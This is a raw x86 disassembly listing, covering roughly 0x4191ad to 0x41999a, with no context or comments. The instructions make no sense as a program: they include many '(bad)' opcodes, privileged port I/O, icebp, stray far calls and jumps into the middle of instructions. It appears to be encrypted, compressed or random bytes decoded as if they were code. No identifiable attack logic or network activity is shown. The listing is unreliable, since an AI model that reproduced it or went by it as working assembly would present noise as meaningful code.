  4191ad:	sbb    ah,BYTE PTR [ecx]
  4191af:	mov    cl,0xaf
  4191b1:	lock mov edx,0xfb45c6c
  4191b7:	outs   dx,BYTE PTR ds:[esi]
  4191b8:	jecxz  0x4191d5
  4191ba:	dec    ecx
  4191bb:	out    dx,al
  4191bc:	imul   DWORD PTR [ebp+0x32]
  4191bf:	ret    0xbb1e
  4191c2:	out    dx,eax
  4191c3:	inc    ecx
  4191c4:	popf   
  4191c5:	test   eax,0x32acb096
  4191ca:	leave  
  4191cb:	ror    cl,1
  4191cd:	ins    BYTE PTR es:[edi],dx
  4191ce:	cmp    DWORD PTR [ebp-0x33],esp
  4191d1:	sbb    DWORD PTR [eax],0x40bf5f93
  4191d7:	sub    al,0x8e
  4191d9:	sbb    al,0xbf
  4191db:	pop    ss
  4191dc:	or     DWORD PTR ds:0x3d18b5e6,0xffffff88
  4191e3:	inc    ecx
  4191e4:	jb     0x41919e
  4191e6:	sahf   
  4191e7:	shl    DWORD PTR [ebp+0x5b954182],0x1a
  4191ee:	push   cs
  4191ef:	out    dx,al
  4191f0:	leave  
  4191f1:	retf   
  4191f2:	xchg   ecx,eax
  4191f3:	and    ebp,DWORD PTR [esi]
  4191f5:	leave  
  4191f6:	fs dec ebx
  4191f8:	jle    0x419226
  4191fa:	add    DWORD PTR [esi],ebx
  4191fc:	popf   
  4191fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191fe:	ds icebp 
  419200:	ins    DWORD PTR es:[edi],dx
  419201:	inc    eax
  419202:	sbb    DWORD PTR [eiz*1-0x663eac60],0xf
  41920a:	outs   dx,BYTE PTR ds:[esi]
  41920b:	sti    
  41920c:	mov    bl,0x78
  41920e:	stos   DWORD PTR es:[edi],eax
  41920f:	push   edi
  419210:	and    eax,0x9d3cd963
  419215:	(bad)  
  419216:	(bad)  
  419217:	fisub  WORD PTR [ebx+0x4f]
  41921a:	jmp    0x9aa510ab
  41921f:	imul   ebx,DWORD PTR [ecx],0xffffffaf
  419222:	pusha  
  419223:	mov    WORD PTR [ebp+eax*2-0x307fe0f7],ds
  41922a:	ret    0x9447
  41922d:	mov    al,ds:0xb8668b50
  419232:	int    0x23
  419234:	fldenv [eax+edi*4+0x787a5402]
  41923b:	arpl   WORD PTR [ecx],si
  41923d:	mov    dh,0x4f
  41923f:	xchg   esi,eax
  419240:	scas   al,BYTE PTR es:[edi]
  419241:	cmp    eax,0xa14765ab
  419246:	jle    0x41926e
  419248:	loopne 0x4191d3
  41924a:	xor    al,bl
  41924c:	mov    esi,0xfa3cbbed
  419251:	xlat   BYTE PTR ds:[ebx]
  419252:	data16 test BYTE PTR [ecx-0x66],0x15
  419257:	mov    eax,ds:0x8316aa1f
  41925c:	fs push ebp
  41925e:	jmp    0xdb804285
  419263:	lahf   
  419264:	popa   
  419265:	add    al,0x8f
  419267:	(bad)  
  419268:	imul   edx,DWORD PTR [eax+0xd],0x9381c9f3
  41926f:	sti    
  419270:	ss ins DWORD PTR es:[edi],dx
  419272:	adc    eax,0x1c5e3027
  419277:	retf   
  419278:	lds    ecx,FWORD PTR [ecx]
  41927a:	out    0x5d,al
  41927c:	ficom  WORD PTR [eax]
  41927e:	xchg   esi,eax
  41927f:	call   0x1069cbea
  419284:	and    dh,BYTE PTR ds:0x7b2afcfd
  41928a:	sbb    al,0x41
  41928c:	push   eax
  41928d:	or     edx,DWORD PTR [ebx]
  41928f:	mov    eax,0xa487b9b6
  419294:	outs   dx,DWORD PTR ds:[si]
  419296:	mov    bl,0xec
  419298:	or     bl,dh
  41929a:	dec    ebp
  41929b:	inc    eax
  41929c:	jae    0x41926d
  41929e:	out    0x59,al
  4192a0:	sub    al,0x85
  4192a2:	mov    dh,0x4c
  4192a4:	sub    esi,edi
  4192a6:	sub    DWORD PTR [ecx],edi
  4192a8:	mov    eax,0x9db8b524
  4192ad:	cmp    eax,0x1754c458
  4192b2:	shr    ecx,cl
  4192b4:	aad    0x48
  4192b6:	vpcmpeqw xmm7,xmm5,XMMWORD PTR [edx-0x7]
  4192bb:	fs xor al,0x53
  4192be:	test   eax,0x98298ac1
  4192c3:	icebp  
  4192c4:	loope  0x419278
  4192c6:	aas    
  4192c7:	xchg   DWORD PTR [eax-0x4828def2],ebp
  4192cd:	test   DWORD PTR [ecx+ecx*8],edx
  4192d0:	jle    0x419292
  4192d2:	dec    edx
  4192d3:	clc    
  4192d4:	mov    ebx,0x3aba542b
  4192d9:	and    DWORD PTR [esi],esp
  4192db:	in     al,dx
  4192dc:	cmc    
  4192dd:	sbb    BYTE PTR [ebp-0x41],al
  4192e0:	mov    cl,0xb2
  4192e2:	test   al,0x35
  4192e4:	jecxz  0x4192bb
  4192e6:	imul   ebx,DWORD PTR [esp+eiz*8-0xe],0x1d
  4192eb:	ss dec esp
  4192ed:	mov    ecx,0x251196c9
  4192f2:	push   ebp
  4192f3:	push   ebx
  4192f4:	icebp  
  4192f5:	aas    
  4192f6:	fwait
  4192f7:	int    0xbd
  4192f9:	and    DWORD PTR [edx],ebp
  4192fb:	mov    esp,0xc541366d
  419300:	ins    BYTE PTR es:[edi],dx
  419301:	aad    0x2a
  419303:	cld    
  419304:	call   0x3ee1:0xa174bf6e
  41930b:	or     eax,0xc4e92a89
  419310:	fcomp  QWORD PTR [esi+0x39fa1ddd]
  419316:	sub    BYTE PTR [ebp+0x3ebb2a4a],ah
  41931c:	pop    ecx
  41931d:	push   esp
  41931e:	or     BYTE PTR [esi+0x26],0xd2
  419322:	inc    esi
  419323:	sub    cl,dh
  419325:	(bad)  
  419326:	push   esi
  419327:	popf   
  419328:	mov    ch,0x4e
  41932a:	loope  0x41937d
  41932c:	mov    edi,0xd0446cf6
  419331:	jae    0x41935d
  419333:	rcr    BYTE PTR [ebp+0x23],cl
  419336:	in     eax,0x42
  419338:	mov    eax,0x5a2f7058
  41933d:	scas   eax,DWORD PTR es:[edi]
  41933e:	xchg   ch,ch
  419340:	ror    DWORD PTR [ebp-0x582003d5],cl
  419346:	in     eax,0xe0
  419348:	push   eax
  419349:	pushf  
  41934a:	mov    al,0x46
  41934c:	jg     0x41936d
  41934e:	adc    esp,DWORD PTR [ebp+0x19]
  419351:	xchg   esi,eax
  419352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419353:	jne    0x419316
  419355:	pushf  
  419356:	(bad)  
  419357:	dec    eax
  419358:	adc    al,0xe6
  41935a:	jle    0x419378
  41935c:	sbb    bh,BYTE PTR [eax-0x8d1df4b]
  419362:	inc    BYTE PTR [eax-0x43]
  419365:	jo     0x4193d3
  419367:	imul   DWORD PTR [eax]
  419369:	jnp    0x4192ec
  41936b:	stos   BYTE PTR es:[edi],al
  41936c:	pop    eax
  41936d:	inc    ebp
  41936e:	gs das 
  419370:	mov    bh,0xbd
  419372:	ja     0x4193e1
  419374:	pop    ecx
  419375:	addr16 out 0xeb,eax
  419378:	call   0xc2015ead
  41937d:	ins    BYTE PTR es:[edi],dx
  41937e:	jmp    0xd6c3:0xfb0ae966
  419385:	call   DWORD PTR [ecx]
  419387:	je     0x41937d
  419389:	int3   
  41938a:	das    
  41938b:	push   0x7c
  41938d:	jns    0x419336
  41938f:	imul   edx,DWORD PTR [ebx-0x3341031c],0xabf7f540
  419399:	lea    eax,[edx+esi*2+0x63cfaca2]
  4193a0:	(bad)  
  4193a1:	mov    ecx,0x75eadf4f
  4193a6:	cs or  DWORD PTR ss:[ebp+0x37855115],edi
  4193ae:	mov    ds:0x93856ba5,al
  4193b3:	sub    BYTE PTR [edx+eiz*8-0x42f526a5],dl
  4193ba:	sub    ch,BYTE PTR [eax]
  4193bc:	int3   
  4193bd:	pop    ebp
  4193be:	jmp    0xfe961016
  4193c3:	ror    DWORD PTR [eax+ebx*4-0x33],cl
  4193c7:	bound  edx,QWORD PTR [eax-0x56]
  4193ca:	cmp    DWORD PTR [eax-0x34],esp
  4193cd:	jle    0x41942f
  4193cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d0:	and    al,0xd
  4193d2:	inc    ecx
  4193d3:	xchg   ebp,eax
  4193d4:	push   0xffffffaf
  4193d6:	pop    ds
  4193d7:	into   
  4193d8:	cdq    
  4193d9:	dec    ebx
  4193da:	xor    ebx,ebp
  4193dc:	lods   eax,DWORD PTR ds:[esi]
  4193dd:	jecxz  0x41941d
  4193df:	or     BYTE PTR [eax],0x8f
  4193e2:	dec    eax
  4193e3:	ret    
  4193e4:	fcom   DWORD PTR [ebx-0x5f6098a8]
  4193ea:	addr16 in al,0xb4
  4193ed:	xchg   DWORD PTR [edi],ecx
  4193ef:	sub    BYTE PTR [ebp+edx*2-0x15],dl
  4193f3:	pop    edx
  4193f4:	pop    ds
  4193f5:	in     eax,0xfb
  4193f7:	cmp    eax,0x13a9ce11
  4193fc:	stos   DWORD PTR es:[edi],eax
  4193fd:	mov    ah,0xbe
  4193ff:	mov    ebx,0x27bfcb5d
  419404:	ret    0x1f39
  419407:	nop
  419408:	sub    ah,cl
  41940a:	pop    es
  41940b:	in     eax,0x8
  41940d:	(bad)  
  41940e:	into   
  41940f:	call   0x87dca9cf
  419414:	test   ebp,esi
  419416:	add    DWORD PTR [ecx+0x4a],ebx
  419419:	mov    ch,0xd1
  41941b:	add    al,0xef
  41941d:	or     BYTE PTR [eax+0x50],ch
  419420:	sbb    edx,DWORD PTR [edi]
  419422:	pop    ds
  419423:	mov    al,0x8
  419425:	int3   
  419426:	cwde   
  419427:	adc    al,0xf7
  419429:	xor    BYTE PTR [edx-0x47],0xbb
  41942d:	xchg   dh,bh
  41942f:	push   ecx
  419430:	xchg   esp,eax
  419431:	fadd   QWORD PTR [ecx+0x30]
  419434:	adc    al,0x51
  419436:	and    eax,0xd01f8b2d
  41943b:	or     BYTE PTR [ebx+esi*1],dl
  41943e:	push   0x758b800
  419443:	lods   eax,DWORD PTR ds:[esi]
  419444:	stos   DWORD PTR es:[edi],eax
  419445:	pmullw mm0,QWORD PTR [edx+0x51]
  419449:	ja     0x419402
  41944b:	fdivr  QWORD PTR [esi+0xd8971b4]
  419451:	cli    
  419452:	sbb    edx,DWORD PTR [edi-0x65]
  419455:	in     eax,dx
  419456:	test   edx,esi
  419458:	sub    dl,BYTE PTR [esi-0x37]
  41945b:	stc    
  41945c:	sbb    al,0xeb
  41945e:	or     bl,0xc2
  419461:	mov    ch,0xa4
  419463:	pop    ds
  419464:	xor    DWORD PTR [eax+0x3f],ebp
  419467:	ret    
  419468:	fsubr  st(5),st
  41946a:	sub    bl,al
  41946c:	jo     0x56045f0
  419472:	outs   dx,BYTE PTR ds:[esi]
  419473:	dec    ebx
  419474:	loope  0x41940e
  419476:	sbb    bh,BYTE PTR [edx+ebp*8-0x6603e1d1]
  41947d:	add    ecx,eax
  41947f:	stc    
  419480:	mov    cl,0xeb
  419482:	jl     0x419497
  419484:	xor    al,0xdb
  419486:	mov    ax,ds:0x438b91e
  41948c:	xchg   edx,eax
  41948d:	test   al,0x8d
  41948f:	clc    
  419490:	je     0x419432
  419492:	add    eax,0x67bc61f1
  419497:	pop    ebp
  419498:	inc    eax
  419499:	xchg   esp,eax
  41949a:	push   esp
  41949b:	outs   dx,BYTE PTR ds:[esi]
  41949c:	or     bh,al
  41949e:	xchg   DWORD PTR [esi+ecx*4],eax
  4194a1:	pop    ds
  4194a2:	lahf   
  4194a3:	loopne 0x41950b
  4194a5:	xchg   esp,eax
  4194a6:	jmp    0x41947e
  4194a8:	fst    st(1)
  4194aa:	mov    eax,0x3ed14f02
  4194af:	sub    al,0x4
  4194b1:	dec    ebp
  4194b2:	push   esp
  4194b3:	mov    bl,0xfb
  4194b5:	ja     0x4194e1
  4194b7:	out    dx,eax
  4194b8:	fs push ss
  4194ba:	xor    cl,BYTE PTR [esi]
  4194bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194bd:	xchg   ebx,eax
  4194be:	or     al,0x46
  4194c0:	ss pop edi
  4194c2:	push   ebp
  4194c3:	sub    al,0x2e
  4194c5:	xlat   BYTE PTR ds:[ebx]
  4194c6:	mov    ?,WORD PTR [esi-0x1f27e7c9]
  4194cc:	jne    0x419457
  4194ce:	xchg   edx,eax
  4194cf:	stos   DWORD PTR es:[edi],eax
  4194d0:	bound  edx,QWORD PTR [ecx]
  4194d2:	xlat   BYTE PTR ds:[ebx]
  4194d3:	js     0x4194cb
  4194d5:	out    dx,eax
  4194d6:	add    eax,0x98c526a4
  4194db:	mov    edi,0xac87a5cb
  4194e0:	dec    esp
  4194e1:	std    
  4194e2:	mov    ds:0x9dd284d,eax
  4194e7:	pop    ebp
  4194e8:	inc    esp
  4194e9:	adc    eax,0x638704d5
  4194ee:	inc    edi
  4194ef:	(bad)  
  4194f0:	xchg   ebp,eax
  4194f1:	ficomp WORD PTR gs:[esi-0xe20b606]
  4194f8:	cmp    al,0x82
  4194fa:	cmc    
  4194fb:	into   
  4194fc:	mov    eax,0x2b8136dd
  419501:	setge  BYTE PTR [ecx+0x54b0d08f]
  419508:	cmp    eax,0xa812f75d
  41950d:	mov    eax,0x26f02518
  419512:	ins    BYTE PTR es:[edi],dx
  419513:	mov    al,0xaa
  419515:	dec    esp
  419516:	pop    esi
  419517:	gs xchg ebx,eax
  419519:	push   esp
  41951a:	add    BYTE PTR [esp+ebp*2+0x7106279d],dh
  419521:	js     0x41954d
  419523:	add    al,0x4
  419525:	pop    ebx
  419526:	adc    al,0xd4
  419528:	mov    ds:0x6c8057e8,eax
  41952d:	rcr    BYTE PTR [eax+0x77],0x60
  419531:	ds push ss
  419533:	add    eax,0x7469e551
  419538:	gs dec ebp
  41953a:	fs and ecx,ebx
  41953d:	stc    
  41953e:	pop    es
  41953f:	stos   BYTE PTR es:[edi],al
  419540:	(bad)
  419544:	aam    0xbb
  419546:	sbb    eax,0x91325b7c
  41954b:	mov    cl,0xea
  41954d:	fcomi  st,st(6)
  41954f:	jnp    0x4194d6
  419551:	mov    al,0xc9
  419553:	fimul  DWORD PTR [eax]
  419555:	in     eax,dx
  419556:	dec    eax
  419557:	in     al,0x57
  419559:	sub    eax,0x356db8d6
  41955e:	lds    edi,FWORD PTR [ebx-0x51fd8c4c]
  419564:	adc    DWORD PTR [edx-0x4c],edi
  419567:	adc    BYTE PTR [ebx+eiz*1-0x2b],bh
  41956b:	and    DWORD PTR [edx-0x53],edx
  41956e:	sbb    al,0x7d
  419570:	sbb    BYTE PTR [ebx+ebx*2+0x705a8df9],al
  419577:	test   eax,0x74b98d6a
  41957c:	hlt    
  41957d:	pop    eax
  41957e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41957f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419580:	enter  0xdfcf,0xb7
  419584:	hlt    
  419585:	mov    ecx,0x397ceaf
  41958a:	mov    ds:0x514f08d5,al
  41958f:	sub    DWORD PTR [edi],esi
  419591:	add    eax,0xa8ac0c88
  419596:	(bad)  
  419597:	or     eax,0xdea0de8f
  41959c:	repnz mov ebx,0xe3ce7f6e
  4195a2:	clc    
  4195a3:	add    BYTE PTR [edx+0x126f2ff2],bh
  4195a9:	jp     0x41954f
  4195ab:	sbb    bh,BYTE PTR [esi]
  4195ad:	push   eax
  4195ae:	sub    BYTE PTR [edx],al
  4195b0:	fmul   st(0),st
  4195b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195b3:	adc    DWORD PTR [ebp+0x52],ebx
  4195b6:	dec    esp
  4195b7:	psubusw mm5,mm5
  4195ba:	mov    ebp,0x2e41c0df
  4195bf:	push   0x9b38a1fb
  4195c4:	aam    0xbe
  4195c6:	aaa    
  4195c7:	fisttp WORD PTR [esi]
  4195c9:	cli    
  4195ca:	pop    ecx
  4195cb:	pop    edi
  4195cc:	jae    0x41963e
  4195ce:	scas   al,BYTE PTR es:[edi]
  4195cf:	mov    ch,0x68
  4195d1:	add    DWORD PTR [edi],ebp
  4195d3:	cmp    eax,0xaa64f391
  4195d8:	jg     0x419650
  4195da:	sbb    DWORD PTR ds:[esi-0x77bf586f],edx
  4195e1:	jle    0x4195e7
  4195e3:	stos   DWORD PTR es:[edi],eax
  4195e4:	jno    0x419570
  4195e6:	sti    
  4195e7:	mov    dl,0xb
  4195e9:	jmp    0x419645
  4195eb:	ja     0x4195c6
  4195ed:	jae    0x41957c
  4195ef:	dec    ebp
  4195f0:	mov    ch,0x60
  4195f2:	sub    cl,BYTE PTR [edx-0x35]
  4195f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195f6:	or     eax,0xfba270f9
  4195fb:	sub    DWORD PTR [esi-0x20],ebp
  4195fe:	pop    ss
  4195ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419600:	dec    eax
  419601:	xchg   esp,eax
  419602:	pop    ecx
  419603:	sbb    BYTE PTR [ebx-0x79],ah
  419606:	add    al,0x3a
  419608:	pop    ebx
  419609:	pop    esi
  41960a:	es stc 
  41960c:	adc    DWORD PTR [edx-0x37519620],0x77
  419613:	ins    DWORD PTR es:[edi],dx
  419614:	test   al,0xe0
  419616:	push   ds
  419617:	jmp    0xb6adad86
  41961c:	push   ss
  41961d:	jnp    0x419609
  41961f:	xor    bh,BYTE PTR [eax-0x115789c9]
  419625:	aam    0xc3
  419627:	jns    0x41962a
  419629:	dec    ebp
  41962a:	xor    dh,dh
  41962c:	je     0x41967c
  41962e:	cmp    al,0x6c
  419630:	lods   eax,DWORD PTR ds:[esi]
  419631:	sub    ah,BYTE PTR [edi-0x2b]
  419634:	mov    eax,0x50c97d23
  419639:	rol    BYTE PTR [esi],1
  41963b:	push   ds
  41963c:	dec    ecx
  41963d:	xor    DWORD PTR [edi+0x4c8c52fb],eax
  419643:	sub    eax,0xddbc1d79
  419648:	mov    edx,0xb22d5402
  41964d:	int3   
  41964e:	adc    DWORD PTR [eax],esi
  419650:	mov    ebx,0x84181845
  419655:	cld    
  419656:	(bad)  
  419657:	and    DWORD PTR [esi-0x5a48cff2],edx
  41965d:	sub    DWORD PTR [eax+0x5423380b],edx
  419663:	das    
  419664:	repnz xor DWORD PTR [eax+0x77],esi
  419668:	jge    0x4195f3
  41966a:	sbb    eax,DWORD PTR [esi-0x2e5bbfc4]
  419670:	out    dx,eax
  419671:	shr    BYTE PTR [edi-0x5e],1
  419674:	add    eax,0xf2393f3b
  419679:	je     0x4196b9
  41967b:	(bad)  
  41967c:	mov    edx,0xc19603aa
  419681:	xor    ch,BYTE PTR [ebp*2-0x212ecf80]
  419688:	mov    dl,0x53
  41968a:	sub    eax,DWORD PTR [ecx]
  41968c:	das    
  41968d:	jnp    0x419652
  41968f:	ret    0xcf0b
  419692:	xchg   edx,eax
  419693:	std    
  419694:	pop    ecx
  419695:	out    0xc1,eax
  419697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419698:	cwde   
  419699:	pop    esi
  41969a:	js     0x41961d
  41969c:	ror    ebx,cl
  41969e:	popa   
  41969f:	mov    eax,0xedf53e99
  4196a4:	pop    ebx
  4196a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196a6:	ds and dl,ch
  4196a9:	pushf  
  4196aa:	js     0x4196e0
  4196ac:	jmp    0x4ea6:0x17a082c7
  4196b3:	sub    DWORD PTR [ebx*8+0x7f47dfd7],ebx
  4196ba:	not    BYTE PTR [ecx+0x5]
  4196bd:	aas    
  4196be:	sbb    ah,BYTE PTR [eax+0x2aa4b884]
  4196c4:	dec    ecx
  4196c5:	(bad)  
  4196c6:	std    
  4196c7:	retf   0x10d7
  4196ca:	imul   edi,DWORD PTR ds:0xb4d0cbff,0x55af6669
  4196d4:	lahf   
  4196d5:	in     eax,dx
  4196d6:	cmp    DWORD PTR [ebp+0x62fb0587],edi
  4196dc:	push   cs
  4196dd:	das    
  4196de:	fidiv  DWORD PTR [edx+0xb5d6939]
  4196e4:	sub    ebx,esp
  4196e6:	(bad)  
  4196e7:	aas    
  4196e8:	xchg   ebx,eax
  4196e9:	ret    
  4196ea:	test   al,0x7e
  4196ec:	jb     0x41972f
  4196ee:	icebp  
  4196ef:	sub    al,0x86
  4196f1:	jge    0x419696
  4196f3:	retf   
  4196f4:	pusha  
  4196f5:	mov    ebx,0xe27e86a4
  4196fa:	or     eax,ebx
  4196fc:	mov    bl,0x2b
  4196fe:	adc    al,0xa
  419700:	or     BYTE PTR [ebp+ebx*8+0x671c4215],0xab
  419708:	pop    edi
  419709:	sti    
  41970a:	inc    esp
  41970b:	mov    ecx,0x3f50c157
  419710:	out    dx,al
  419711:	mov    bh,0x9e
  419713:	mov    esp,0x1a1e8ed3
  419718:	ins    BYTE PTR es:[edi],dx
  419719:	ins    DWORD PTR es:[edi],dx
  41971a:	sub    DWORD PTR [eax-0x24ed95c4],0x32
  419721:	mov    WORD PTR [ebp-0x14],ds
  419724:	rcl    DWORD PTR [eax-0x62fa73f6],0x68
  41972b:	cmp    eax,0x7adacbc1
  419730:	pop    ebp
  419731:	fwait
  419732:	xchg   al,cl
  419734:	sbb    eax,0x1bbbcd50
  419739:	jbe    0x419728
  41973b:	push   edx
  41973c:	cmp    eax,0x8ff42bf1
  419741:	dec    esi
  419742:	sbb    ch,ah
  419744:	call   0x4122da41
  419749:	cld    
  41974a:	inc    esp
  41974b:	fstp   QWORD PTR [edx-0x69cfd5b6]
  419751:	sub    dl,bh
  419753:	add    DWORD PTR [eax+ebp*4],0xfffffffb
  419757:	xchg   esi,eax
  419758:	cmp    dl,ah
  41975a:	inc    ebx
  41975b:	jnp    0x4197cd
  41975d:	jo     0x4197d2
  41975f:	enter  0x8c39,0x23
  419763:	ror    BYTE PTR [ebp+0x4e],cl
  419766:	ins    BYTE PTR es:[edi],dx
  419767:	stos   BYTE PTR es:[edi],al
  419768:	das    
  419769:	push   0x4034eb9f
  41976e:	push   edi
  41976f:	pop    eax
  419770:	add    eax,0x1e8de3e2
  419775:	imul   ebp,DWORD PTR [eax-0x1964348f],0x1f2abbb6
  41977f:	inc    edx
  419780:	cmp    ecx,DWORD PTR [edi-0x206a7281]
  419786:	and    dl,bh
  419788:	icebp  
  419789:	jl     0x4197c7
  41978b:	sub    al,0xf0
  41978d:	loopne 0x419780
  41978f:	adc    BYTE PTR [ebx-0x4aabcf0f],dh
  419795:	imul   ecx,DWORD PTR [edi-0x6],0x1e
  419799:	jne    0x4197c3
  41979b:	sub    bh,bl
  41979d:	je     0x419757
  41979f:	adc    DWORD PTR [edx-0x2489d90a],ecx
  4197a5:	(bad)  
  4197a7:	mov    ch,0x44
  4197a9:	iret   
  4197aa:	cmp    DWORD PTR [edx-0x3b],edi
  4197ad:	fld    DWORD PTR [edi-0x4616e9c5]
  4197b3:	mov    WORD PTR [ecx+ebp*8-0x30],fs
  4197b7:	sahf   
  4197b8:	(bad)  
  4197b9:	dec    DWORD PTR [eax-0x7afbd048]
  4197bf:	dec    edx
  4197c0:	inc    esi
  4197c1:	fnstenv [edx+esi*8]
  4197c4:	push   esp
  4197c5:	and    al,0x6c
  4197c7:	mov    ecx,0xcb7be76d
  4197cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197cd:	push   edx
  4197ce:	cs dec esp
  4197d0:	mov    ch,0x87
  4197d2:	sbb    al,0x6
  4197d4:	and    eax,ebp
  4197d6:	js     0x41978f
  4197d8:	popf   
  4197d9:	cmp    edx,ebx
  4197db:	rcr    BYTE PTR [ecx],cl
  4197dd:	mov    eax,ds:0xecdbe032
  4197e2:	in     al,0x8c
  4197e4:	out    0xed,eax
  4197e6:	fs ja  0x41976d
  4197e9:	cmp    edi,DWORD PTR [ecx]
  4197eb:	jg     0x419803
  4197ed:	(bad)  
  4197ee:	dec    eax
  4197ef:	(bad)  
  4197f0:	mov    eax,0xb283c0de
  4197f5:	mov    dh,0x84
  4197f7:	fadd   QWORD PTR [ecx]
  4197f9:	cs adc al,0x32
  4197fc:	push   ss
  4197fd:	xchg   ebp,eax
  4197fe:	or     bh,BYTE PTR [eax-0x5b]
  419801:	mov    dh,BYTE PTR [eax]
  419803:	ret    
  419804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419805:	jb     0x4197e8
  419807:	ret    0x6ccf
  41980a:	or     eax,0x43cb1f76
  41980f:	xchg   edi,eax
  419810:	aas    
  419811:	pop    es
  419812:	mov    dh,0xb
  419814:	test   DWORD PTR [ebp+0x68ad830c],edx
  41981a:	dec    ebp
  41981b:	fld    st(2)
  41981d:	cmp    DWORD PTR [edi-0x6fda69bd],0x36ed03d7
  419827:	cmp    BYTE PTR [ebp+0x66126440],al
  41982d:	dec    DWORD PTR [ecx]
  41982f:	mov    cl,0x4f
  419831:	test   DWORD PTR [eax],0xcdbfd220
  419837:	mov    cl,0x63
  419839:	sub    cl,BYTE PTR [eax]
  41983b:	mov    esi,?
  41983d:	popa   
  41983e:	add    edx,DWORD PTR [ecx+0x6f37c213]
  419844:	test   al,0x86
  419846:	inc    edx
  419847:	sub    al,0x93
  419849:	adc    edx,DWORD PTR [esp+edx*4]
  41984c:	jbe    0x4197f5
  41984e:	xor    BYTE PTR [ebp+0x4e1aaa46],dh
  419854:	push   edx
  419855:	cmp    DWORD PTR [ebx],eax
  419857:	rol    ecx,0x1c
  41985a:	mov    bl,0x3a
  41985c:	adc    BYTE PTR [ebx],dh
  41985e:	dec    ebp
  41985f:	imul   edx,DWORD PTR [esi-0x6d]
  419863:	in     al,dx
  419864:	jnp    0x4197fe
  419866:	aas    
  419867:	adc    DWORD PTR [ebx-0x18],edi
  41986a:	jns    0x419868
  41986c:	xor    DWORD PTR [edx-0x24],0x7f11eb80
  419873:	stc    
  419874:	inc    ebp
  419875:	retf   
  419876:	aas    
  419877:	popa   
  419878:	pop    esp
  419879:	ret    0x8523
  41987c:	jmp    0x419813
  41987e:	call   0x42b2:0x566e4fae
  419885:	out    0xb1,eax
  419887:	fdiv   QWORD PTR [ecx+eax*8+0x170a0051]
  41988e:	dec    esi
  41988f:	pop    ebp
  419890:	inc    edx
  419891:	push   ebx
  419892:	jp     0x4198c3
  419894:	mov    dh,BYTE PTR [edx+0x7a]
  419897:	sbb    al,0x7c
  419899:	cmp    DWORD PTR [ebp+0x1bfc2c27],ecx
  41989f:	jecxz  0x4198df
  4198a1:	lods   al,BYTE PTR ds:[esi]
  4198a2:	xchg   esp,eax
  4198a3:	mov    edx,esp
  4198a5:	mov    esi,0xf2e3139
  4198aa:	mov    ds:0x3e3aae9e,al
  4198b0:	dec    ebp
  4198b1:	dec    eax
  4198b2:	mov    dl,0x9c
  4198b4:	leave  
  4198b5:	push   edi
  4198b6:	in     al,0xa5
  4198b8:	sub    al,0xda
  4198bb:	es fmul st(4),st
  4198be:	pop    esp
  4198bf:	and    edi,esp
  4198c1:	mov    DWORD PTR [edi-0x6a],eax
  4198c4:	jbe    0x4198a6
  4198c6:	retf   0xf5d6
  4198c9:	repnz outs dx,BYTE PTR ds:[esi]
  4198cb:	enter  0x3a2d,0x51
  4198cf:	xor    eax,0x224d177f
  4198d4:	es add al,0x4e
  4198d7:	inc    eax
  4198d8:	aaa    
  4198d9:	push   esi
  4198da:	clc    
  4198db:	push   edi
  4198dc:	lock iret 
  4198de:	out    0x8,eax
  4198e0:	sub    edx,eax
  4198e2:	fwait
  4198e3:	mov    edx,0x932318fc
  4198e8:	shl    DWORD PTR [edi],0xab
  4198eb:	ds mov bh,cl
  4198ee:	pop    esp
  4198ef:	mov    ah,0x94
  4198f1:	mov    eax,0x4238a551
  4198f6:	mov    dh,0xad
  4198f8:	stc    
  4198f9:	outs   dx,DWORD PTR ds:[esi]
  4198fa:	sub    DWORD PTR [esi+0x7f363284],0x4c7db12
  419904:	xchg   edi,eax
  419905:	call   0x64ed:0xae377e52
  41990c:	push   ecx
  41990d:	cwde   
  41990e:	lahf   
  41990f:	add    bh,cl
  419911:	or     cl,0xe8
  419914:	or     cl,BYTE PTR [edi]
  419916:	pop    edi
  419917:	inc    ebp
  419918:	pop    esi
  419919:	ins    BYTE PTR es:[edi],dx
  41991a:	loop   0x41992e
  41991c:	jae    0x41995c
  41991e:	mov    esi,0xdbe8e24a
  419923:	sbb    cl,bh
  419925:	mov    al,ds:0xddd3e1fb
  41992a:	pop    ds
  41992b:	pop    ebx
  41992c:	rcl    BYTE PTR [eax+eiz*4+0x247d8663],0xa7
  419934:	in     eax,dx
  419935:	shl    BYTE PTR [edx+0x13ad9063],1
  41993b:	test   eax,0xf15b25cd
  419940:	xchg   esp,eax
  419941:	outs   dx,BYTE PTR ds:[esi]
  419942:	call   0x363e0bb5
  419947:	in     eax,0x6c
  419949:	int    0xf9
  41994b:	fsub   st,st(5)
  41994d:	xor    al,0x82
  41994f:	dec    ecx
  419950:	pop    es
  419951:	cmp    ebp,DWORD PTR ds:0x81d177b2
  419957:	ds jbe 0x4199c7
  41995a:	mov    edi,0xbc977868
  41995f:	jne    0x419994
  419961:	mov    ebx,0x46fa6e2f
  419966:	jns    0x41994e
  419968:	xor    ch,BYTE PTR [ecx+0x78]
  41996b:	xor    BYTE PTR [ebx],ch
  41996d:	(bad)  
  41996e:	std    
  41996f:	loope  0x419954
  419971:	test   cl,dl
  419973:	ds mov dl,0xff
  419976:	call   DWORD PTR [edi-0x69a1f483]
  41997c:	jnp    0x4199ac
  41997e:	dec    esi
  41997f:	sbb    ebp,DWORD PTR [ecx+0x46]
  419982:	fisub  DWORD PTR [eax+0x6769f8ec]
  419988:	callw  0x34
  41998c:	or     esp,eax
  41998e:	adc    DWORD PTR [ebx],eax
  419990:	inc    ecx
  419991:	ds cld 
  419993:	gs pusha 
  419995:	push   esi
  419996:	test   BYTE PTR [edx-0x33],dh
  419999:	pop    edx
  41999a:	and    cl,dh
